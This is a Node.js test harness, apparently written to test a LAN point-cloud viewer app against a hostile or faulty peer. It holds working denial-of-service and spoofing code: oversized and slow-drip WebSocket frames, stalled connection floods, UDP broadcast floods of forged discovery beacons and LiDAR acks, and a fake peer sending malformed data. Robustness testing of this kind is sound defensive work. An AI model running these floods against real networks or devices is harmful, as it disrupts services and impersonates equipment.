// attacker.js — 同じ LAN にいる悪意のある（または壊れた）相手を模す（A07）。node attacker.js '<JSON>'
//   mode=bigmsg  … 配信元の WebSocket につなぎ、大きなメッセージを送りつける（target, conns, mb, count）
//   mode=stuck   … 配信元につないで、時間をずらして受信を止める（target, conns, staggerMs）
//   mode=beacons … 配信の知らせ（UDP 47800）を大量に送る（bcast, n, perSec, name）
//   mode=acks    … LiDAR の検出の返事（UDP 56000）を、でたらめな SN で大量に送る（bcast, n, perSec）
//   mode=peer    … にせの配信元（知らせを出し、つないできた相手に壊れたメッセージを送る）（bcast, name, kind, every）
//   mode=hold    … 配信元につないだまま何もしない（数だけ増やす）（target, conns）
'use strict';
const dgram = require('node:dgram');
const net = require('node:net');
const crypto = require('node:crypto');
const WebSocket = require('/home/claude/pcd-viewer/node_modules/ws');
const o = JSON.parse(process.argv[2] || '{}');
const out = x => process.stdout.write(JSON.stringify(x) + '\n');
const sleep = ms => new Promise(r => setTimeout(r, ms));

function crc16(buf) { let c = 0xffff; for (const b of buf) { c ^= b << 8; for (let k = 0; k < 8; k++) c = (c & 0x8000) ? ((c << 1) ^ 0x1021) & 0xffff : (c << 1) & 0xffff; } return c; }
const T32 = new Uint32Array(256); for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = (c & 1) ? (0xedb88320 ^ (c >>> 1)) : (c >>> 1); T32[n] = c >>> 0; }
function crc32(buf) { let c = 0xffffffff; for (const b of buf) c = T32[(c ^ b) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; }
function pack(cmdId, cmdType, seq, data) { const b = Buffer.alloc(24 + data.length); b[0] = 0xaa; b.writeUInt16LE(b.length, 2); b.writeUInt32LE(seq, 4); b.writeUInt16LE(cmdId, 8); b[10] = cmdType; b[11] = 1; b.writeUInt16LE(crc16(b.subarray(0, 18)), 18); b.writeUInt32LE(data.length ? crc32(data) : 0, 20); data.copy(b, 24); return b; }

(async () => {
  if (o.mode === 'bigmsg') {
    const conns = [];
    for (let i = 0; i < (o.conns || 1); i++) {
      const ws = new WebSocket(o.target, { perMessageDeflate: false }); ws.on('error', e => out({ ev: 'err', i, msg: e.message })); ws.on('close', (c, r) => out({ ev: 'close', i, code: c, reason: String(r) }));
      ws.on('message', () => {}); conns.push(ws);
    }
    await Promise.all(conns.map(ws => new Promise(r => ws.once('open', r).once('error', r))));
    out({ ev: 'open', n: conns.filter(c => c.readyState === 1).length });
    const big = Buffer.alloc((o.mb || 90) * 1048576, 0x41);
    for (let k = 0; k < (o.count || 1); k++) {
      for (const ws of conns) if (ws.readyState === 1) ws.send(big);
      out({ ev: 'sent', k });
      await sleep(o.gapMs || 3000);
    }
    await sleep(o.holdMs || 5000);
    out({ ev: 'done', open: conns.filter(c => c.readyState === 1).length });
    process.exit(0);
  }
  if (o.mode === 'slowframe') {
    // フレームの頭だけ送って（長さ = mb MB と申告）、中身を少しずつ送る（相手は全部届くまでためる）
    const u = new URL(o.target); const socks = [];
    for (let i = 0; i < (o.conns || 1); i++) {
      const s = net.connect(+u.port, u.hostname); socks.push(s);
      await new Promise(r => s.once('connect', r));
      const key = crypto.randomBytes(16).toString('base64');
      s.write(`GET / HTTP/1.1\r\nHost: ${u.host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`);
      s.on('data', () => {}); s.on('error', () => {});
      const len = (o.mb || 90) * 1048576; const h = Buffer.alloc(14); h[0] = 0x82; h[1] = 0x80 | 127; h.writeBigUInt64BE(BigInt(len), 2); crypto.randomBytes(4).copy(h, 10);
      s.write(h);
      s.sent = 0; s.len = len;
    }
    out({ ev: 'open', n: socks.length });
    const chunk = Buffer.alloc((o.chunkKb || 1024) * 1024, 0x42);
    const t0 = Date.now();
    while (Date.now() - t0 < (o.secs || 20) * 1000) {
      for (const s of socks) if (s.sent < s.len - chunk.length) { s.write(chunk); s.sent += chunk.length; }
      await sleep(o.gapMs || 100);
    }
    out({ ev: 'done', sentMB: socks.map(s => Math.round(s.sent / 1048576)) });
    await sleep(o.holdMs || 1000);
    process.exit(0);
  }
  if (o.mode === 'stuck' || o.mode === 'hold') {
    const u = new URL(o.target); const socks = [];
    for (let i = 0; i < (o.conns || 1); i++) {
      const s = net.connect(+u.port, u.hostname); socks.push(s);
      await new Promise(r => s.once('connect', r));
      s.on('error', () => {});
      const key = crypto.randomBytes(16).toString('base64');
      s.write(`GET / HTTP/1.1\r\nHost: ${u.host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`);
      if (o.mode === 'stuck') { s.on('data', () => {}); await sleep(o.staggerMs || 3000); s.pause(); s.removeAllListeners('data'); } // ここから読まない
      else { s.on('data', () => {}); }
      out({ ev: 'conn', i });
    }
    out({ ev: 'open', n: socks.length });
    await sleep(o.holdMs || 10000);
    process.exit(0);
  }
  if (o.mode === 'beacons' || o.mode === 'acks') {
    const s = dgram.createSocket({ type: 'udp4', reuseAddr: true }); await new Promise(r => s.bind(o.mode === 'acks' ? 0 : 0, r)); s.setBroadcast(true);
    const n = o.n || 1000, per = o.perSec || 1000; let sent = 0; const t0 = Date.now();
    while (sent < n) {
      const k = Math.min(n - sent, Math.max(1, Math.round(per / 100)));
      for (let i = 0; i < k; i++, sent++) {
        let msg, port;
        if (o.mode === 'beacons') { msg = Buffer.from(JSON.stringify({ app: 'pcd-viewer', v: 1, name: (o.name || 'evil') + sent, port: 1000 + (sent % 60000), model: 'MID-360', sn: 'X' + sent, id: 'e' + sent })); port = 47800; }
        else { const d = Buffer.alloc(24); d[1] = 9; Buffer.from(('FLOOD' + sent).padEnd(16, '0').slice(0, 16), 'latin1').copy(d, 2); Buffer.from([10, 107, 0, 99]).copy(d, 18); d.writeUInt16LE(56100, 22); msg = pack(0, 1, sent, d); port = 56000; }
        s.send(msg, port, o.bcast || '10.107.0.255');
      }
      await sleep(10);
    }
    out({ ev: 'done', sent, ms: Date.now() - t0 });
    await sleep(500); process.exit(0);
  }
  if (o.mode === 'peer') {
    const srv = new WebSocket.Server({ port: o.port || 0 });
    await new Promise(r => srv.once('listening', r));
    const port = srv.address().port;
    const b = dgram.createSocket({ type: 'udp4', reuseAddr: true }); await new Promise(r => b.bind(0, r)); b.setBroadcast(true);
    setInterval(() => b.send(Buffer.from(JSON.stringify({ app: 'pcd-viewer', v: 1, name: o.name || 'lab-pc', port, model: 'MID-360', sn: '47MDL9T0020193', id: 'evil' })), 47800, o.bcast || '10.107.0.255'), 1000);
    srv.on('connection', ws => {
      out({ ev: 'victim' });
      let k = 0;
      const tm = setInterval(() => {
        if (ws.readyState !== 1) return clearInterval(tm);
        k++;
        let m;
        if (o.kind === 'nbig') { m = Buffer.alloc(8 + 13 * 10); m.write('PCV1', 0, 'latin1'); m.writeUInt32LE(1000000, 4); }          // 点数を実際より多く申告
        else if (o.kind === 'nan') { const n = 1000; m = Buffer.alloc(8 + 13 * n); m.write('PCV1', 0, 'latin1'); m.writeUInt32LE(n, 4); const f = new Float32Array(m.buffer, m.byteOffset + 8, 3 * n); for (let i = 0; i < 3 * n; i++) f[i] = i % 3 === 2 ? NaN : (Math.random() * 20 - 10); }
        else if (o.kind === 'huge') { const n = 7000000; m = Buffer.alloc(8 + 13 * n); m.write('PCV1', 0, 'latin1'); m.writeUInt32LE(n, 4); }
        else if (o.kind === 'good') { const n = o.pts || 1000; m = Buffer.alloc(8 + 13 * n); m.write('PCV1', 0, 'latin1'); m.writeUInt32LE(n, 4); const f = new Float32Array(m.buffer, m.byteOffset + 8, 3 * n); for (let i = 0; i < n; i++) { const a = i / n * 2 * Math.PI; f[3 * i] = 3 * Math.cos(a); f[3 * i + 1] = 3 * Math.sin(a); f[3 * i + 2] = 0.5; } }
        else { m = Buffer.from('hello'); }
        ws.send(m);
        if (o.max && k >= o.max) clearInterval(tm);
      }, o.every || 500);
    });
    out({ ev: 'ready', port });
    setTimeout(() => process.exit(0), (o.secs || 30) * 1000);
  }
})().catch(e => { out({ ev: 'fatal', msg: e.stack }); process.exit(1); });
